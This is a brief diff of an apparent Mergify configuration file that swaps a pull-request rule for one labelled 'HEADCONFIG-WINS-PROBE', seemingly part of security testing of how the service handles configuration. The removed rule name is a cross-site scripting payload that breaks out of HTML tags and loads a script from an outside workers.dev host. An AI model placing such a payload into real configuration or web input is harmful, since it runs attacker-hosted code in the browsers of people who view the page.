@@ -1,11 +1,7 @@
-queue_rules:
-  - name: default
-    merge_conditions: []
-
 pull_request_rules:
-  - name: '"''></textarea></script><script src=//s.a7n2q.workers.dev/mergify-yml'
+  - name: HEADCONFIG-WINS-PROBE
     conditions:
       - base=main
     actions:
       label:
-        add: ["mgf-test"]
+        add: ["HEADCONFIG-WINS-7K"]
